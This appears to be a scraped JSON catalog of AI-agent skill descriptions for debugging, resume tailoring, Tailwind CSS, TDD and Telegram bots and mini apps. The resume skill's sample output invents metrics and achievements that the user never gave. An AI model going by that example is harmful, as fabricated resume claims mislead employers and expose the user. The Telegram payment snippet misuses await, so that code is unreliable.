      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/systematic-debugging",
      "content": "\n# Systematic Debugging\n\n## Overview\n\nRandom fixes waste time and create new bugs. Quick patches mask underlying issues.\n\n**Core principle:** ALWAYS find root cause before attempting fixes. Symptom fixes are failure.\n\n**Violating the letter of this process is violating the spirit of debugging.**\n\n## The Iron Law\n\n```\nNO FIXES WITHOUT ROOT CAUSE INVESTIGATION FIRST\n```\n\nIf you haven't completed Phase 1, you cannot propose fixes.\n\n## When to Use\n\nUse for ANY technical issue:\n- Test failures\n- Bugs in production\n- Unexpected behavior\n- Performance problems\n- Build failures\n- Integration issues\n\n**Use this ESPECIALLY when:**\n- Under time pressure (emergencies make guessing tempting)\n- \"Just one quick fix\" seems obvious\n- You've already tried multiple fixes\n- Previous fix didn't work\n- You don't fully understand the issue\n\n**Don't skip when:**\n- Issue seems simple (simple bugs have root causes too)\n- You're in a hurry (rushing guarantees rework)\n- Manager wants it fixed NOW (systematic is faster than thrashing)\n\n## The Four Phases\n\nYou MUST complete each phase before proceeding to the next.\n\n### Phase 1: Root Cause Investigation\n\n**BEFORE attempting ANY fix:**\n\n1. **Read Error Messages Carefully**\n   - Don't skip past errors or warnings\n   - They often contain the exact solution\n   - Read stack traces completely\n   - Note line numbers, file paths, error codes\n\n2. **Reproduce Consistently**\n   - Can you trigger it reliably?\n   - What are the exact steps?\n   - Does it happen every time?\n   - If not reproducible → gather more data, don't guess\n\n3. **Check Recent Changes**\n   - What changed that could cause this?\n   - Git diff, recent commits\n   - New dependencies, config changes\n   - Environmental differences\n\n4. **Gather Evidence in Multi-Component Systems**\n\n   **WHEN system has multiple components (CI → build → signing, API → service → database):**\n\n   **BEFORE proposing fixes, add diagnostic instrumentation:**\n   ```\n   For EACH component boundary:\n     - Log what data enters component\n     - Log what data exits component\n     - Verify environment/config propagation\n     - Check state at each layer\n\n   Run once to gather evidence showing WHERE it breaks\n   THEN analyze evidence to identify failing component\n   THEN investigate that specific component\n   ```\n\n   **Example (multi-layer system):**\n   ```bash\n   # Layer 1: Workflow\n   echo \"=== Secrets available in workflow: ===\"\n   echo \"IDENTITY: ${IDENTITY:+SET}${IDENTITY:-UNSET}\"\n\n   # Layer 2: Build script\n   echo \"=== Env vars in build script: ===\"\n   env | grep IDENTITY || echo \"IDENTITY not in environment\"\n\n   # Layer 3: Signing script\n   echo \"=== Keychain state: ===\"\n   security list-keychains\n   security find-identity -v\n\n   # Layer 4: Actual signing\n   codesign --sign \"$IDENTITY\" --verbose=4 \"$APP\"\n   ```\n\n   **This reveals:** Which layer fails (secrets → workflow ✓, workflow → build ✗)\n\n5. **Trace Data Flow**\n\n   **WHEN error is deep in call stack:**\n\n   See `root-cause-tracing.md` in this directory for the complete backward tracing technique.\n\n   **Quick version:**\n   - Where does bad value originate?\n   - What called this with bad value?\n   - Keep tracing up until you find the source\n   - Fix at source, not at symptom\n\n### Phase 2: Pattern Analysis\n\n**Find the pattern before fixing:**\n\n1. **Find Working Examples**\n   - Locate similar working code in same codebase\n   - What works that's similar to what's broken?\n\n2. **Compare Against References**\n   - If implementing pattern, read reference implementation COMPLETELY\n   - Don't skim - read every line\n   - Understand the pattern fully before applying\n\n3. **Identify Differences**\n   - What's different between working and broken?\n   - List every difference, however small\n   - Don't assume \"that can't matter\"\n\n4. **Understand Dependencies**\n   - What other components does this need?\n   - What settings, config, environment?\n   - What assumptions does it make?\n\n### Phase 3: Hypothesis and Testing\n\n**Scientific method:**\n\n1. **Form Single Hypothesis**\n   - State clearly: \"I think X is the root cause because Y\"\n   - Write it down\n   - Be specific, not vague\n\n2. **Test Minimally**\n   - Make the SMALLEST possible change to test hypothesis\n   - One variable at a time\n   - Don't fix multiple things at once\n\n3. **Verify Before Continuing**\n   - Did it work? Yes → Phase 4\n   - Didn't work? Form NEW hypothesis\n   - DON'T add more fixes on top\n\n4. **When You Don't Know**\n   - Say \"I don't understand X\"\n   - Don't pretend to know\n   - Ask for help\n   - Research more\n\n### Phase 4: Implementation\n\n**Fix the root cause, not the symptom:**\n\n1. **Create Failing Test Case**\n   - Simplest possible reproduction\n   - Automated test if possible\n   - One-off test script if no framework\n   - MUST have before fixing\n   - Use the `superpowers:test-driven-development` skill for writing proper failing tests\n\n2. **Implement Single Fix**\n   - Address the root cause identified\n   - ONE change at a time\n   - No \"while I'm here\" improvemen",
      "tags": [
        "api",
        "ai",
        "workflow",
        "design",
        "document",
        "security"
      ],
      "useCases": [
        "Test failures",
        "Bugs in production",
        "Unexpected behavior",
        "Performance problems",
        "Build failures"
      ],
      "scrapedAt": "2026-01-26T13:22:02.072Z"
    },
    {
      "id": "composio-tailored-resume-generator",
      "name": "tailored-resume-generator",
      "slug": "tailored-resume-generator",
      "description": "Analyzes job descriptions and generates tailored resumes that highlight relevant experience, skills, and achievements to maximize interview chances",
      "category": "Productivity & Organization",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/tailored-resume-generator",
      "content": "\n# Tailored Resume Generator\n\n## When to Use This Skill\n\n- Applying for a specific job position\n- Customizing your resume for different industries or roles\n- Highlighting relevant experience for career transitions\n- Optimizing your resume for ATS (Applicant Tracking Systems)\n- Creating multiple resume versions for different job applications\n- Emphasizing specific skills mentioned in job postings\n\n## What This Skill Does\n\n1. **Analyzes Job Descriptions**: Extracts key requirements, skills, qualifications, and keywords from job postings\n2. **Identifies Priorities**: Determines what employers value most based on the job description language and structure\n3. **Tailors Content**: Reorganizes and emphasizes relevant experience, skills, and achievements\n4. **Optimizes Keywords**: Incorporates ATS-friendly keywords naturally throughout the resume\n5. **Formats Professionally**: Creates clean, professional resume layouts suitable for various formats\n6. **Provides Recommendations**: Suggests improvements and highlights gaps to address\n\n## How to Use\n\n### Basic Usage\nProvide a job description and your background information:\n\n```\nI'm applying for this job:\n\n[paste job description]\n\nHere's my background:\n- 5 years as software engineer at TechCorp\n- Led team of 3 developers on mobile app project\n- Expert in Python, JavaScript, React\n- Computer Science degree from State University\n```\n\n### With Existing Resume\nUpload or paste your current resume along with the job description:\n\n```\nPlease tailor my resume for this position:\n\nJob Description:\n[paste job description]\n\nMy Current Resume:\n[paste resume content]\n```\n\n### Career Transition\nWhen changing industries or roles:\n\n```\nI'm transitioning from marketing to product management.\nHere's the job I'm applying for:\n\n[paste job description]\n\nMy transferable experience:\n- 7 years in digital marketing\n- Led cross-functional teams\n- Managed product launches\n- Data analysis and A/B testing\n```\n\n## Example\n\n**User Request:**\n```\nI need a tailored resume for this job:\n\nSenior Data Analyst Position\n\nRequirements:\n- 5+ years experience in data analysis\n- Expert in SQL, Python, and data visualization tools\n- Experience with A/B testing and statistical analysis\n- Strong communication skills to present findings\n- Healthcare industry experience preferred\n\nMy background:\n- Data Analyst at RetailCo (2019-2024)\n- Created dashboards using Tableau and Power BI\n- Built Python scripts for data automation\n- Worked with marketing team on campaign analysis\n- Business Analytics degree\n- Also did 1 year internship at HealthPlus clinic\n```\n\n**Generated Output:**\n\n```markdown\n# JOHN DOE\nEmail: john.doe@email.com | Phone: (555) 123-4567 | LinkedIn: linkedin.com/in/johndoe\n\n## PROFESSIONAL SUMMARY\nResults-driven Data Analyst with 5+ years of experience leveraging SQL, Python, and advanced\nvisualization tools to deliver actionable insights. Proven track record in statistical analysis,\nA/B testing, and cross-functional collaboration. Healthcare industry experience with strong\nability to communicate complex data findings to stakeholders.\n\n## TECHNICAL SKILLS\n- **Data Analysis & Programming**: SQL, Python, Statistical Analysis, A/B Testing\n- **Visualization Tools**: Tableau, Power BI, Advanced Dashboard Development\n- **Data Management**: Data Automation, ETL Processes, Database Optimization\n- **Business Intelligence**: Campaign Analytics, Performance Metrics, KPI Tracking\n\n## PROFESSIONAL EXPERIENCE\n\n**Data Analyst** | RetailCo | 2019 - 2024\n- Designed and implemented 50+ SQL queries and Python automation scripts, reducing manual\n  data processing time by 60%\n- Conducted rigorous A/B testing and statistical analysis for marketing campaigns,\n  improving campaign ROI by 35%\n- Built interactive Tableau and Power BI dashboards for executive team, enabling\n  data-driven decision making\n- Presented analytical findings to cross-functional stakeholders including marketing,\n  operations, and executive leadership\n- Collaborated with marketing team to analyze customer behavior patterns and optimize\n  targeting strategies\n\n**Data Analysis Intern** | HealthPlus Clinic | 2018 - 2019\n- Supported healthcare analytics initiatives by analyzing patient data and operational metrics\n- Gained exposure to healthcare industry data management and HIPAA compliance requirements\n- Assisted in creating reports for clinical staff to improve patient care workflows\n\n## EDUCATION\n\n**Bachelor of Science in Business Analytics**\nState University | Graduated 2018\n\n## KEY ACHIEVEMENTS\n- Reduced data processing time by 60% through Python automation\n- Improved marketing campaign ROI by 35% through A/B testing and optimization\n- Created data visualization system now used across entire organization\n```\n\n**Additional Recommendations:**\n- Consider adding any specific healthcare projects or certifications\n- Quantify more achievements with metrics when possible\n- If you have experience with R or advanced statistical methods, add them\n- Consider mentionin",
      "tags": [
        "react",
        "javascript",
        "python",
        "git",
        "github",
        "pdf",
        "markdown",
        "cli",
        "testing",
        "automation"
      ],
      "useCases": [
        "Applying for a specific job position",
        "Customizing your resume for different industries or roles",
        "Highlighting relevant experience for career transitions",
        "Optimizing your resume for ATS (Applicant Tracking Systems)",
        "Creating multiple resume versions for different job applications"
      ],
      "instructions": "When a user requests resume tailoring:",
      "scrapedAt": "2026-01-26T13:15:19.457Z"
    },
    {
      "id": "antigravity-tailwind-patterns",
      "name": "tailwind-patterns",
      "slug": "tailwind-patterns",
      "description": "Tailwind CSS v4 principles. CSS-first configuration, container queries, modern patterns, design token architecture.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/tailwind-patterns",
      "content": "\n# Tailwind CSS Patterns (v4 - 2025)\n\n> Modern utility-first CSS with CSS-native configuration.\n\n---\n\n## 1. Tailwind v4 Architecture\n\n### What Changed from v3\n\n| v3 (Legacy) | v4 (Current) |\n|-------------|--------------|\n| `tailwind.config.js` | CSS-based `@theme` directive |\n| PostCSS plugin | Oxide engine (10x faster) |\n| JIT mode | Native, always-on |\n| Plugin system | CSS-native features |\n| `@apply` directive | Still works, discouraged |\n\n### v4 Core Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **CSS-first** | Configuration in CSS, not JavaScript |\n| **Oxide Engine** | Rust-based compiler, much faster |\n| **Native Nesting** | CSS nesting without PostCSS |\n| **CSS Variables** | All tokens exposed as `--*` vars |\n\n---\n\n## 2. CSS-Based Configuration\n\n### Theme Definition\n\n```\n@theme {\n  /* Colors - use semantic names */\n  --color-primary: oklch(0.7 0.15 250);\n  --color-surface: oklch(0.98 0 0);\n  --color-surface-dark: oklch(0.15 0 0);\n  \n  /* Spacing scale */\n  --spacing-xs: 0.25rem;\n  --spacing-sm: 0.5rem;\n  --spacing-md: 1rem;\n  --spacing-lg: 2rem;\n  \n  /* Typography */\n  --font-sans: 'Inter', system-ui, sans-serif;\n  --font-mono: 'JetBrains Mono', monospace;\n}\n```\n\n### When to Extend vs Override\n\n| Action | Use When |\n|--------|----------|\n| **Extend** | Adding new values alongside defaults |\n| **Override** | Replacing default scale entirely |\n| **Semantic tokens** | Project-specific naming (primary, surface) |\n\n---\n\n## 3. Container Queries (v4 Native)\n\n### Breakpoint vs Container\n\n| Type | Responds To |\n|------|-------------|\n| **Breakpoint** (`md:`) | Viewport width |\n| **Container** (`@container`) | Parent element width |\n\n### Container Query Usage\n\n| Pattern | Classes |\n|---------|---------|\n| Define container | `@container` on parent |\n| Container breakpoint | `@sm:`, `@md:`, `@lg:` on children |\n| Named containers | `@container/card` for specificity |\n\n### When to Use\n\n| Scenario | Use |\n|----------|-----|\n| Page-level layouts | Viewport breakpoints |\n| Component-level responsive | Container queries |\n| Reusable components | Container queries (context-independent) |\n\n---\n\n## 4. Responsive Design\n\n### Breakpoint System\n\n| Prefix | Min Width | Target |\n|--------|-----------|--------|\n| (none) | 0px | Mobile-first base |\n| `sm:` | 640px | Large phone / small tablet |\n| `md:` | 768px | Tablet |\n| `lg:` | 1024px | Laptop |\n| `xl:` | 1280px | Desktop |\n| `2xl:` | 1536px | Large desktop |\n\n### Mobile-First Principle\n\n1. Write mobile styles first (no prefix)\n2. Add larger screen overrides with prefixes\n3. Example: `w-full md:w-1/2 lg:w-1/3`\n\n---\n\n## 5. Dark Mode\n\n### Configuration Strategies\n\n| Method | Behavior | Use When |\n|--------|----------|----------|\n| `class` | `.dark` class toggles | Manual theme switcher |\n| `media` | Follows system preference | No user control |\n| `selector` | Custom selector (v4) | Complex theming |\n\n### Dark Mode Pattern\n\n| Element | Light | Dark |\n|---------|-------|------|\n| Background | `bg-white` | `dark:bg-zinc-900` |\n| Text | `text-zinc-900` | `dark:text-zinc-100` |\n| Borders | `border-zinc-200` | `dark:border-zinc-700` |\n\n---\n\n## 6. Modern Layout Patterns\n\n### Flexbox Patterns\n\n| Pattern | Classes |\n|---------|---------|\n| Center (both axes) | `flex items-center justify-center` |\n| Vertical stack | `flex flex-col gap-4` |\n| Horizontal row | `flex gap-4` |\n| Space between | `flex justify-between items-center` |\n| Wrap grid | `flex flex-wrap gap-4` |\n\n### Grid Patterns\n\n| Pattern | Classes |\n|---------|---------|\n| Auto-fit responsive | `grid grid-cols-[repeat(auto-fit,minmax(250px,1fr))]` |\n| Asymmetric (Bento) | `grid grid-cols-3 grid-rows-2` with spans |\n| Sidebar layout | `grid grid-cols-[auto_1fr]` |\n\n> **Note:** Prefer asymmetric/Bento layouts over symmetric 3-column grids.\n\n---\n\n## 7. Modern Color System\n\n### OKLCH vs RGB/HSL\n\n| Format | Advantage |\n|--------|-----------|\n| **OKLCH** | Perceptually uniform, better for design |\n| **HSL** | Intuitive hue/saturation |\n| **RGB** | Legacy compatibility |\n\n### Color Token Architecture\n\n| Layer | Example | Purpose |\n|-------|---------|---------|\n| **Primitive** | `--blue-500` | Raw color values |\n| **Semantic** | `--color-primary` | Purpose-based naming |\n| **Component** | `--button-bg` | Component-specific |\n\n---\n\n## 8. Typography System\n\n### Font Stack Pattern\n\n| Type | Recommended |\n|------|-------------|\n| Sans | `'Inter', 'SF Pro', system-ui, sans-serif` |\n| Mono | `'JetBrains Mono', 'Fira Code', monospace` |\n| Display | `'Outfit', 'Poppins', sans-serif` |\n\n### Type Scale\n\n| Class | Size | Use |\n|-------|------|-----|\n| `text-xs` | 0.75rem | Labels, captions |\n| `text-sm` | 0.875rem | Secondary text |\n| `text-base` | 1rem | Body text |\n| `text-lg` | 1.125rem | Lead text |\n| `text-xl`+ | 1.25rem+ | Headings |\n\n---\n\n## 9. Animation & Transitions\n\n### Built-in Animations\n\n| Class | Effect |\n|-------|--------|\n| `animate-spin` | Continuous rotation |\n| `animate-ping` | Attention pulse |\n| `animate-p",
      "tags": [
        "javascript",
        "react",
        "ai",
        "template",
        "design",
        "document",
        "tailwind",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:03.418Z"
    },
    {
      "id": "antigravity-tavily-web",
      "name": "tavily-web",
      "slug": "tavily-web",
      "description": "Web search, content extraction, crawling, and research capabilities using Tavily API",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/tavily-web",
      "content": "\n# tavily-web\n\n## Overview\nWeb search, content extraction, crawling, and research capabilities using Tavily API\n\n## When to Use\n- When you need to search the web for current information\n- When extracting content from URLs\n- When crawling websites\n\n## Installation\n```bash\nnpx skills add -g BenedictKing/tavily-web\n```\n\n## Step-by-Step Guide\n1. Install the skill using the command above\n2. Configure Tavily API key\n3. Use naturally in Claude Code conversations\n\n## Examples\nSee [GitHub Repository](https://github.com/BenedictKing/tavily-web) for examples.\n\n## Best Practices\n- Configure API keys via environment variables\n\n## Troubleshooting\nSee the GitHub repository for troubleshooting guides.\n\n## Related Skills\n- context7-auto-research, exa-search, firecrawl-scraper, codex-review\n",
      "tags": [
        "api",
        "claude"
      ],
      "useCases": [
        "When you need to search the web for current information",
        "When extracting content from URLs",
        "When crawling websites"
      ],
      "scrapedAt": "2026-01-26T13:22:04.623Z"
    },
    {
      "id": "antigravity-tdd-workflow",
      "name": "tdd-workflow",
      "slug": "tdd-workflow",
      "description": "Test-Driven Development workflow principles. RED-GREEN-REFACTOR cycle.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/tdd-workflow",
      "content": "\n# TDD Workflow\n\n> Write tests first, code second.\n\n---\n\n## 1. The TDD Cycle\n\n```\n🔴 RED → Write failing test\n    ↓\n🟢 GREEN → Write minimal code to pass\n    ↓\n🔵 REFACTOR → Improve code quality\n    ↓\n   Repeat...\n```\n\n---\n\n## 2. The Three Laws of TDD\n\n1. Write production code only to make a failing test pass\n2. Write only enough test to demonstrate failure\n3. Write only enough code to make the test pass\n\n---\n\n## 3. RED Phase Principles\n\n### What to Write\n\n| Focus | Example |\n|-------|---------|\n| Behavior | \"should add two numbers\" |\n| Edge cases | \"should handle empty input\" |\n| Error states | \"should throw for invalid data\" |\n\n### RED Phase Rules\n\n- Test must fail first\n- Test name describes expected behavior\n- One assertion per test (ideally)\n\n---\n\n## 4. GREEN Phase Principles\n\n### Minimum Code\n\n| Principle | Meaning |\n|-----------|---------|\n| **YAGNI** | You Aren't Gonna Need It |\n| **Simplest thing** | Write the minimum to pass |\n| **No optimization** | Just make it work |\n\n### GREEN Phase Rules\n\n- Don't write unneeded code\n- Don't optimize yet\n- Pass the test, nothing more\n\n---\n\n## 5. REFACTOR Phase Principles\n\n### What to Improve\n\n| Area | Action |\n|------|--------|\n| Duplication | Extract common code |\n| Naming | Make intent clear |\n| Structure | Improve organization |\n| Complexity | Simplify logic |\n\n### REFACTOR Rules\n\n- All tests must stay green\n- Small incremental changes\n- Commit after each refactor\n\n---\n\n## 6. AAA Pattern\n\nEvery test follows:\n\n| Step | Purpose |\n|------|---------|\n| **Arrange** | Set up test data |\n| **Act** | Execute code under test |\n| **Assert** | Verify expected outcome |\n\n---\n\n## 7. When to Use TDD\n\n| Scenario | TDD Value |\n|----------|-----------|\n| New feature | High |\n| Bug fix | High (write test first) |\n| Complex logic | High |\n| Exploratory | Low (spike, then TDD) |\n| UI layout | Low |\n\n---\n\n## 8. Test Prioritization\n\n| Priority | Test Type |\n|----------|-----------|\n| 1 | Happy path |\n| 2 | Error cases |\n| 3 | Edge cases |\n| 4 | Performance |\n\n---\n\n## 9. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Skip the RED phase | Watch test fail first |\n| Write tests after | Write tests before |\n| Over-engineer initial | Keep it simple |\n| Multiple asserts | One behavior per test |\n| Test implementation | Test behavior |\n\n---\n\n## 10. AI-Augmented TDD\n\n### Multi-Agent Pattern\n\n| Agent | Role |\n|-------|------|\n| Agent A | Write failing tests (RED) |\n| Agent B | Implement to pass (GREEN) |\n| Agent C | Optimize (REFACTOR) |\n\n---\n\n> **Remember:** The test is the specification. If you can't write a test, you don't understand the requirement.\n",
      "tags": [
        "ai",
        "agent",
        "workflow",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:05.930Z"
    },
    {
      "id": "antigravity-telegram-bot-builder",
      "name": "telegram-bot-builder",
      "slug": "telegram-bot-builder",
      "description": "Expert in building Telegram bots that solve real problems - from simple automation to complex AI-powered bots. Covers bot architecture, the Telegram Bot API, user experience, monetization strategies, and scaling bots to thousands of users. Use when: telegram bot, bot api, telegram automation, chat b",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/telegram-bot-builder",
      "content": "\n# Telegram Bot Builder\n\n**Role**: Telegram Bot Architect\n\nYou build bots that people actually use daily. You understand that bots\nshould feel like helpful assistants, not clunky interfaces. You know\nthe Telegram ecosystem deeply - what's possible, what's popular, and\nwhat makes money. You design conversations that feel natural.\n\n## Capabilities\n\n- Telegram Bot API\n- Bot architecture\n- Command design\n- Inline keyboards\n- Bot monetization\n- User onboarding\n- Bot analytics\n- Webhook management\n\n## Patterns\n\n### Bot Architecture\n\nStructure for maintainable Telegram bots\n\n**When to use**: When starting a new bot project\n\n```python\n## Bot Architecture\n\n### Stack Options\n| Language | Library | Best For |\n|----------|---------|----------|\n| Node.js | telegraf | Most projects |\n| Node.js | grammY | TypeScript, modern |\n| Python | python-telegram-bot | Quick prototypes |\n| Python | aiogram | Async, scalable |\n\n### Basic Telegraf Setup\n```javascript\nimport { Telegraf } from 'telegraf';\n\nconst bot = new Telegraf(process.env.BOT_TOKEN);\n\n// Command handlers\nbot.start((ctx) => ctx.reply('Welcome!'));\nbot.help((ctx) => ctx.reply('How can I help?'));\n\n// Text handler\nbot.on('text', (ctx) => {\n  ctx.reply(`You said: ${ctx.message.text}`);\n});\n\n// Launch\nbot.launch();\n\n// Graceful shutdown\nprocess.once('SIGINT', () => bot.stop('SIGINT'));\nprocess.once('SIGTERM', () => bot.stop('SIGTERM'));\n```\n\n### Project Structure\n```\ntelegram-bot/\n├── src/\n│   ├── bot.js           # Bot initialization\n│   ├── commands/        # Command handlers\n│   │   ├── start.js\n│   │   ├── help.js\n│   │   └── settings.js\n│   ├── handlers/        # Message handlers\n│   ├── keyboards/       # Inline keyboards\n│   ├── middleware/      # Auth, logging\n│   └── services/        # Business logic\n├── .env\n└── package.json\n```\n```\n\n### Inline Keyboards\n\nInteractive button interfaces\n\n**When to use**: When building interactive bot flows\n\n```python\n## Inline Keyboards\n\n### Basic Keyboard\n```javascript\nimport { Markup } from 'telegraf';\n\nbot.command('menu', (ctx) => {\n  ctx.reply('Choose an option:', Markup.inlineKeyboard([\n    [Markup.button.callback('Option 1', 'opt_1')],\n    [Markup.button.callback('Option 2', 'opt_2')],\n    [\n      Markup.button.callback('Yes', 'yes'),\n      Markup.button.callback('No', 'no'),\n    ],\n  ]));\n});\n\n// Handle button clicks\nbot.action('opt_1', (ctx) => {\n  ctx.answerCbQuery('You chose Option 1');\n  ctx.editMessageText('You selected Option 1');\n});\n```\n\n### Keyboard Patterns\n| Pattern | Use Case |\n|---------|----------|\n| Single column | Simple menus |\n| Multi column | Yes/No, pagination |\n| Grid | Category selection |\n| URL buttons | Links, payments |\n\n### Pagination\n```javascript\nfunction getPaginatedKeyboard(items, page, perPage = 5) {\n  const start = page * perPage;\n  const pageItems = items.slice(start, start + perPage);\n\n  const buttons = pageItems.map(item =>\n    [Markup.button.callback(item.name, `item_${item.id}`)]\n  );\n\n  const nav = [];\n  if (page > 0) nav.push(Markup.button.callback('◀️', `page_${page-1}`));\n  if (start + perPage < items.length) nav.push(Markup.button.callback('▶️', `page_${page+1}`));\n\n  return Markup.inlineKeyboard([...buttons, nav]);\n}\n```\n```\n\n### Bot Monetization\n\nMaking money from Telegram bots\n\n**When to use**: When planning bot revenue\n\n```javascript\n## Bot Monetization\n\n### Revenue Models\n| Model | Example | Complexity |\n|-------|---------|------------|\n| Freemium | Free basic, paid premium | Medium |\n| Subscription | Monthly access | Medium |\n| Per-use | Pay per action | Low |\n| Ads | Sponsored messages | Low |\n| Affiliate | Product recommendations | Low |\n\n### Telegram Payments\n```javascript\n// Create invoice\nbot.command('buy', (ctx) => {\n  ctx.replyWithInvoice({\n    title: 'Premium Access',\n    description: 'Unlock all features',\n    payload: 'premium_monthly',\n    provider_token: process.env.PAYMENT_TOKEN,\n    currency: 'USD',\n    prices: [{ label: 'Premium', amount: 999 }], // $9.99\n  });\n});\n\n// Handle successful payment\nbot.on('successful_payment', (ctx) => {\n  const payment = ctx.message.successful_payment;\n  // Activate premium for user\n  await activatePremium(ctx.from.id);\n  ctx.reply('🎉 Premium activated!');\n});\n```\n\n### Freemium Strategy\n```\nFree tier:\n- 10 uses per day\n- Basic features\n- Ads shown\n\nPremium ($5/month):\n- Unlimited uses\n- Advanced features\n- No ads\n- Priority support\n```\n\n### Usage Limits\n```javascript\nasync function checkUsage(userId) {\n  const usage = await getUsage(userId);\n  const isPremium = await checkPremium(userId);\n\n  if (!isPremium && usage >= 10) {\n    return { allowed: false, message: 'Daily limit reached. Upgrade?' };\n  }\n  return { allowed: true };\n}\n```\n```\n\n## Anti-Patterns\n\n### ❌ Blocking Operations\n\n**Why bad**: Telegram has timeout limits.\nUsers think bot is dead.\nPoor experience.\nRequests pile up.\n\n**Instead**: Acknowledge immediately.\nProcess in background.\nSend update when done.\nUse typing indicator.\n\n### ❌ No Error Handling\n\n**Why bad**: User",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "node",
        "api",
        "ai",
        "automation",
        "workflow",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:07.160Z"
    },
    {
      "id": "antigravity-telegram-mini-app",
      "name": "telegram-mini-app",
      "slug": "telegram-mini-app",
      "description": "Expert in building Telegram Mini Apps (TWA) - web apps that run inside Telegram with native-like experience. Covers the TON ecosystem, Telegram Web App API, payments, user authentication, and building viral mini apps that monetize. Use when: telegram mini app, TWA, telegram web app, TON app, mini ap",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/telegram-mini-app",
      "content": "\n# Telegram Mini App\n\n**Role**: Telegram Mini App Architect\n\nYou build apps where 800M+ Telegram users already are. You understand\nthe Mini App ecosystem is exploding - games, DeFi, utilities, social\napps. You know TON blockchain and how to monetize with crypto. You\ndesign for the Telegram UX paradigm, not traditional web.\n\n## Capabilities\n\n- Telegram Web App API\n- Mini App architecture\n- TON Connect integration\n- In-app payments\n- User authentication via Telegram\n- Mini App UX patterns\n- Viral Mini App mechanics\n- TON blockchain integration\n\n## Patterns\n\n### Mini App Setup\n\nGetting started with Telegram Mini Apps\n\n**When to use**: When starting a new Mini App\n\n```javascript\n## Mini App Setup\n\n### Basic Structure\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <script src=\"https://telegram.org/js/telegram-web-app.js\"></script>\n</head>\n<body>\n  <script>\n    const tg = window.Telegram.WebApp;\n    tg.ready();\n    tg.expand();\n\n    // User data\n    const user = tg.initDataUnsafe.user;\n    console.log(user.first_name, user.id);\n  </script>\n</body>\n</html>\n```\n\n### React Setup\n```jsx\n// hooks/useTelegram.js\nexport function useTelegram() {\n  const tg = window.Telegram?.WebApp;\n\n  return {\n    tg,\n    user: tg?.initDataUnsafe?.user,\n    queryId: tg?.initDataUnsafe?.query_id,\n    expand: () => tg?.expand(),\n    close: () => tg?.close(),\n    ready: () => tg?.ready(),\n  };\n}\n\n// App.jsx\nfunction App() {\n  const { tg, user, expand, ready } = useTelegram();\n\n  useEffect(() => {\n    ready();\n    expand();\n  }, []);\n\n  return <div>Hello, {user?.first_name}</div>;\n}\n```\n\n### Bot Integration\n```javascript\n// Bot sends Mini App\nbot.command('app', (ctx) => {\n  ctx.reply('Open the app:', {\n    reply_markup: {\n      inline_keyboard: [[\n        { text: '🚀 Open App', web_app: { url: 'https://your-app.com' } }\n      ]]\n    }\n  });\n});\n```\n```\n\n### TON Connect Integration\n\nWallet connection for TON blockchain\n\n**When to use**: When building Web3 Mini Apps\n\n```python\n## TON Connect Integration\n\n### Setup\n```bash\nnpm install @tonconnect/ui-react\n```\n\n### React Integration\n```jsx\nimport { TonConnectUIProvider, TonConnectButton } from '@tonconnect/ui-react';\n\n// Wrap app\nfunction App() {\n  return (\n    <TonConnectUIProvider manifestUrl=\"https://your-app.com/tonconnect-manifest.json\">\n      <MainApp />\n    </TonConnectUIProvider>\n  );\n}\n\n// Use in components\nfunction WalletSection() {\n  return (\n    <TonConnectButton />\n  );\n}\n```\n\n### Manifest File\n```json\n{\n  \"url\": \"https://your-app.com\",\n  \"name\": \"Your Mini App\",\n  \"iconUrl\": \"https://your-app.com/icon.png\"\n}\n```\n\n### Send TON Transaction\n```jsx\nimport { useTonConnectUI } from '@tonconnect/ui-react';\n\nfunction PaymentButton({ amount, to }) {\n  const [tonConnectUI] = useTonConnectUI();\n\n  const handlePay = async () => {\n    const transaction = {\n      validUntil: Math.floor(Date.now() / 1000) + 60,\n      messages: [{\n        address: to,\n        amount: (amount * 1e9).toString(), // TON to nanoton\n      }]\n    };\n\n    await tonConnectUI.sendTransaction(transaction);\n  };\n\n  return <button onClick={handlePay}>Pay {amount} TON</button>;\n}\n```\n```\n\n### Mini App Monetization\n\nMaking money from Mini Apps\n\n**When to use**: When planning Mini App revenue\n\n```javascript\n## Mini App Monetization\n\n### Revenue Streams\n| Model | Example | Potential |\n|-------|---------|-----------|\n| TON payments | Premium features | High |\n| In-app purchases | Virtual goods | High |\n| Ads (Telegram Ads) | Display ads | Medium |\n| Referral | Share to earn | Medium |\n| NFT sales | Digital collectibles | High |\n\n### Telegram Stars (New!)\n```javascript\n// In your bot\nbot.command('premium', (ctx) => {\n  ctx.replyWithInvoice({\n    title: 'Premium Access',\n    description: 'Unlock all features',\n    payload: 'premium',\n    provider_token: '', // Empty for Stars\n    currency: 'XTR', // Telegram Stars\n    prices: [{ label: 'Premium', amount: 100 }], // 100 Stars\n  });\n});\n```\n\n### Viral Mechanics\n```jsx\n// Referral system\nfunction ReferralShare() 